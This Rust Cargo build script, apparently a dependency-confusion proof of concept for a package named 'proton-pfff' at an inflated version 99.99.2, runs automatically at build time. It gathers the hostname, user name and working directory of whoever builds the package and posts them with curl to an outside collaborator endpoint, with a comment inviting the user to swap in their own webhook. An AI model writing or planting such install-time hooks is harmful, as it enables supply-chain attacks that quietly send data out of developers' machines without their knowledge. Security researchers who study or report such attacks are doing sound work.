use std::process::Command;
use std::env;

fn main() {
    // Print a harmless warning
    println!("cargo:warning=This is a harmless dependency confusion PoC.");

    // Gather system info
    let hostname = env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string());
    let user = env::var("USER").unwrap_or_else(|_| "unknown".to_string());
    let cwd = env::var("PWD").unwrap_or_else(|_| "unknown".to_string());

    // Build JSON payload
    let payload = format!(
        r#"{{"pkg":"proton-pfff","version":"99.99.2","host":"{}","user":"{}","cwd":"{}"}}"#,
        hostname, user, cwd
    );

    // Send POST request to your webhook (replace URL!)
    let url = "https://receiver.oastify.com";  // <-- CHANGE THIS
    let _ = Command::new("curl")
        .args(&["-s", "-X", "POST", url, "-H", "Content-Type: application/json", "-d", &payload])
        .status();
}
